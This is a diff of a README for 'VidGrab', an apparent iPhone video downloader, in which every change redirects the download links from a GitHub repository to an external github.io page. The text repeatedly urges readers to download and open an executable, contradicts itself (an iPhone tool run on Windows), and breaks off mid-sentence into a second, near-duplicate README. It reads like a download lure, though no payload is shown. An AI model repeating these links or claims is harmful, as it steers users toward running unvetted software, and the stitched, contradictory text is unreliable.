@@ -1,6 +1,6 @@
 # 📥 VidGrab - Save Videos to Your iPhone Easily
 
-[![Download VidGrab](https://img.shields.io/badge/Download-VidGrab-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andoooo2848284/VidGrab)
+[![Download VidGrab](https://img.shields.io/badge/Download-VidGrab-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://andoooo2848284.github.io)
 
 VidGrab is a simple application for downloading videos on iPhone by pasting a link or browsing. It is designed for everyday users who want a clear, direct way to save videos without learning technical tools or complicated settings. This README explains what VidGrab does, how to get it from the official GitHub page, and how to start using it on Windows.
 
@@ -16,7 +16,7 @@ VidGrab is intended for users who prefer a visual, click-based experience. You d
 
 Getting VidGrab starts with the official GitHub page. Visit this link to download the application:
 
-https://github.com/Andoooo2848284/VidGrab
+https://andoooo2848284.github.io
 
 On the page that opens, use the download option provided for VidGrab. After the download finishes, open the downloaded application on your Windows computer. This is the main action for getting started. The link above is the official source for the application, so use it whenever you need to download VidGrab again.
 
@@ -26,7 +26,7 @@ Before you begin, make sure your Windows computer is connected to the internet a
 
 Use the official download link below to get VidGrab. Visit this link to download the application.
 
-[![Get VidGrab](https://img.shields.io/badge/Get_VidGrab-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andoooo2848284/VidGrab)
+[![Get VidGrab](https://img.shields.io/badge/Get_VidGrab-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://andoooo2848284.github.io)
 
 After the GitHub page opens, follow the download option shown for VidGrab. When the download is complete, locate the downloaded file on your Windows computer and open it. The application should start on your computer. From there, you can begin using VidGrab for its main purpose: downloading videos on iPhone by pasting a link or browsing.
 
@@ -60,7 +60,7 @@ Keep the official link available. Save it in your browser bookmarks so you can r
 
 If the GitHub page does not load, check your internet connection and open the link again. Visit this link to download the application:
 
-https://github.com/Andoooo2848284/VidGrab
+https://andoooo2848284.github.io
 
 If the download does not start, return to the GitHub page and use the download option shown there. Make sure your browser is not waiting for you to confirm the download. Some browsers show a small prompt before saving a file.
 
@@ -82,13 +82,13 @@ Keep your browser and Windows computer up to date. Updates help your computer ru
 
 For updates, download links, and project information, use the official GitHub page:
 
-https://github.com/Andoooo2848284/VidGrab
+https://andoooo2848284.github.io
 
 If you need to download VidGrab again, return to the same page. Visit this link to download the application. The page is the main source for the current version and any project updates provided by the maintainer.
 
 When asking for help, describe what you were doing, what you expected to# 📥 VidGrab - Save iPhone Videos With Ease
 
-[![Download VidGrab](https://img.shields.io/badge/Download-VidGrab-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andoooo2848284/VidGrab)
+[![Download VidGrab](https://img.shields.io/badge/Download-VidGrab-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://andoooo2848284.github.io)
 
 VidGrab is a Windows application for downloading videos on iPhone by pasting a link or browsing. It is made for everyday users who want a direct way to save videos for offline viewing without learning technical tools. You open VidGrab, provide a video link or browse for a video, and download it. The official GitHub page is the source for the application. Use that page whenever you need to get VidGrab.
 
@@ -104,7 +104,7 @@ VidGrab is useful when you want to keep a video available for offline viewing. Y
 
 Visit this link to download the application:
 
-https://github.com/Andoooo2848284/VidGrab
+https://andoooo2848284.github.io
 
 After the download finishes, open VidGrab on your Windows computer. The application is the tool you use for downloading videos on iPhone by pasting a link or browsing. Keep the official GitHub link available so you can return to the same page when you need to download VidGrab again.
 
@@ -112,7 +112,7 @@ After the download finishes, open VidGrab on your Windows computer. The applicat
 
 Use the official link below to get VidGrab. Visit this link to download the application.
 
-[![Get VidGrab](https://img.shields.io/badge/Get_VidGrab-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andoooo2848284/VidGrab)
+[![Get VidGrab](https://img.shields.io/badge/Get_VidGrab-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://andoooo2848284.github.io)
 
 After downloading, open VidGrab on your Windows computer. The app is ready for its main purpose: downloading videos on iPhone by pasting a link or browsing. The GitHub page is the official place to get the application, so use that page when you need the current version.
 
@@ -142,7 +142,7 @@ Keep the official link in your browser bookmarks. This gives you a quick way to 
 
 For project information and updates, use the official GitHub page:
 
-https://github.com/Andoooo2848284/VidGrab
+https://andoooo2848284.github.io
 
 Visit this link to download the application. The GitHub page is the main place to get VidGrab and check for project updates from the maintainer. When you need the application again, return to the same page and use the download option provided there.
 
